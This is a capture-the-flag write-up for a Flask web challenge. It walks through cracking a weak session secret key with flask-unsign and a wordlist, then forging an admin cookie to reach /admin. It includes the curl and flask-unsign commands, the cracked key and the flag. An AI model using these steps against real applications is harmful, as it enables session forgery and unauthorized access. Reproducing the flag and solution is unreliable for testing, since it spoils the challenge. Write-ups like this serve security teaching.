# cookie-monster — Writeup

**Category:** Web  
**Flag:** `ictf{ForgingCookiesSinceFlask}`

---

## Overview

A Flask web application signs session cookies with a weak, guessable `secret_key` (`monstermaster`). By cracking the key offline and re-signing a forged cookie with `role=admin`, an attacker gains access to the admin panel and the flag.

---

## Vulnerability
Flask signs session cookies using HMAC-SHA1 with the app's `secret_key`. The key
is weak (`monstermaster`) and appears in common wordlists. Players can:
1. Decode the base64 session cookie to read the plaintext payload.
2. Crack the HMAC signature offline using `flask-unsign` + a wordlist.
3. Re-sign a forged cookie with `role=admin` using the cracked key.
4. Send the forged cookie to `/admin` to retrieve the flag.

## Tools Required
- `flask-unsign` (`pip install flask-unsign`)
- A common password wordlist (e.g. `rockyou.txt`)

## Step-by-Step Solution

### Step 1 — Register and log in as a guest

Navigate to the app, register any account, and log in. You'll be redirected to
`/dashboard` and your browser will hold a `session` cookie.

### Step 2 — Grab the session cookie

Copy the `session` cookie value from browser DevTools or via curl:

```bash
# Register
curl -c cookies.txt -X POST http://<host>:8000/register \
  -d "username=hacker&password=hacker"

# Login and save the session cookie
curl -c cookies.txt -b cookies.txt -X POST http://<host>:8000/login \
  -d "username=hacker&password=hacker" -L

# Show the cookie
cat cookies.txt
```

The cookie looks like:
```
eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJndWVzdCJ9.XXXXX.YYYYYYYYYYYYYYYYYY
```

### Step 3 — Decode the cookie (optional, confirms the payload)

Flask session cookies are base64-encoded JSON + HMAC signature. Decode with
`flask-unsign`:

```bash
flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJndWVzdCJ9.XXX.YYY'
# Output: {'role': 'guest', 'username': 'hacker'}
```

The dashboard even hints: *"Flask session cookies are signed, not encrypted."*

### Step 4 — Crack the secret key

```bash
flask-unsign --unsign \
  --cookie 'eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJndWVzdCJ9.XXX.YYY' \
  --wordlist writeup/rockyou.txt --no-literal-eval

# Output: [*] Secret key: monstermaster
```

`monstermaster` appears in common wordlists. This step typically takes seconds.

### Step 5 — Forge an admin cookie

```bash
flask-unsign --sign \
  --cookie "{'role': 'admin', 'username': 'hacker'}" \
  --secret 'monstermaster'

# Output: eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImhhY2tlciJ9.AAAAA.BBBBBBBBBBBBB
```

### Step 6 — Send the forged cookie to /admin

```bash
curl -b "session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImhhY2tlciJ9.AAAAA.BBB" \
  http://<host>:8000/admin
```

The server reads `role=admin` from the cookie and returns the flag page.

## Flag
```
ictf{ForgingCookiesSinceFlask}
```

## Key Lesson
Flask's session mechanism provides **integrity** (tamper detection via HMAC) but
**not confidentiality** — anyone can read the payload. The entire security model
rests on the secrecy and strength of `secret_key`. A weak or guessable key makes
the signing trivially bypassable.
